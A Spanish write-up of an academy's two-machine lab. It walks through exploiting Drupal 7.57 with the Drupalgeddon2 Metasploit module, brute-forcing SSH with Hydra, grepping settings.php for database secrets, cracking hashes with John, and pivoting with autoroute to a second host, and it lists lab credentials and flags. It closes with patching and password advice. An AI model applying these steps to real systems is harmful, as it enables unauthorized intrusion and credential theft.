# Pivot — Laboratorio de Academia (Hacker Mentor)

**Plataforma:** Laboratorio interno de la academia (no es de TryHackMe)
**Sistema operativo:** Linux (dos máquinas encadenadas)
**Dificultad:** Media
**Categoría:** Drupalgeddon2, Pivoting con Metasploit

## Resumen

Laboratorio de dos máquinas encadenadas en red interna. La primera máquina expone un sitio Drupal 7.57 vulnerable a **Drupalgeddon2**, que permite ejecución remota de código. Tras obtener acceso, se identifica una segunda máquina en la red interna solo alcanzable a través de la primera, por lo que se realiza **pivoting** con Metasploit para comprometerla también.

## 1. Reconocimiento — Máquina 1

Escaneo de puertos por debajo de 1000 con el script de reconocimiento y Nmap:

**Puertos abiertos:** 22 (SSH), 80 (HTTP), 111 (RPC).

En el puerto 80 se identificó un sitio en **Drupal**. Mediante análisis de `robots.txt` y fuzzing de directorios se localizó el archivo `CHANGELOG.txt`, que expone el historial de versiones del CMS:

```bash
gobuster dir -u http://<IP> -w <wordlist> -x txt,php,zip \
  -s 200,204,301,302,307,401,403 -b ""
```

**Versión identificada:** Drupal 7.57.

## 2. Explotación — Máquina 1

Se utilizó Metasploit con el exploit **Drupalgeddon2**:

```
msf6 > use exploit/multi/http/drupal_drupalgeddon2
msf6 > set RHOSTS <IP>
msf6 > exploit
```

Se obtuvo una shell (no meterpreter) en el sistema. Revisando `/etc/passwd`, los únicos usuarios con shell válida (`/bin/bash`) eran **root** y **flag4**.

Para obtener la contraseña del usuario `flag4` se realizó fuerza bruta contra SSH con Hydra y un diccionario común:

```bash
hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  -t 50 -f ssh://<IP>
```

**Credenciales obtenidas:** `flag4 : orange`

### Credenciales de base de datos

Buscando la palabra `password` dentro del directorio de configuración de Drupal:

```bash
grep -Ri "password" /var/www/sites/default/settings.php
```

**Ruta:** `/var/www/sites/default/settings.php`
**Credenciales:** base de datos `drupaldb`, usuario `dbuser`, contraseña `R0ck3t`

Dentro de la base de datos, en la tabla `users`, se enumeraron los hashes de los usuarios registrados y se crackearon con **John the Ripper**:

| Usuario | Contraseña |
|---|---|
| Admin | 53cr3t |
| Fred | MyPassword |
| prueba1 | prueba1 |
| juego1 | password |

Para estabilizar la sesión se convirtió la shell a Meterpreter con el módulo:

```
post/multi/manage/shell_to_meterpreter
```

## 3. Pivoting hacia la Máquina 2

Con acceso a la máquina 1, se analizó la red interna para descubrir el segundo objetivo:

```bash
./ip.sh
```

Se detectaron los hosts `10.10.10.100` y `10.10.10.101` en el segmento interno.

Se generó una ruta a través de la máquina comprometida con:

```
post/multi/manage/autoroute
```

Con la ruta establecida, se realizó un escaneo de puertos sobre el segundo objetivo y un ataque de fuerza bruta con Hydra (a través de la sesión pivotada) para obtener credenciales de un usuario **root**:

```
auxiliary/scanner/portscan/tcp
```

Contraseña obtenida para `root`: `simple`.

## 4. Acceso a la Máquina 2

Con las credenciales obtenidas se accedió por SSH a través del pivote:

```bash
ssh root@10.10.10.101
```

**Nombre de host de la máquina final:** `gift`

## 5. Banderas

| Bandera | Valor |
|---|---|
| User flag | `HMV665sXzDS` |
| Root flag | `HMVtyr543FG` |

## 6. Herramientas usadas

- ARP-Scan
- Nmap
- Gobuster
- Metasploit (Drupalgeddon2, autoroute, shell_to_meterpreter)
- Hydra
- John the Ripper
- SSH

## 7. Conclusiones y recomendaciones

1. El uso de una versión desactualizada de Drupal (7.57) permitió explotación crítica vía Drupalgeddon2.
2. Las contraseñas débiles de usuarios (`orange`, `simple`) fueron vulnerables a fuerza bruta con diccionarios comunes.
3. **Recomendación:** mantener el CMS actualizado, aplicar políticas de contraseñas robustas, y segmentar adecuadamente la red interna para limitar el impacto del pivoting en caso de compromiso inicial.
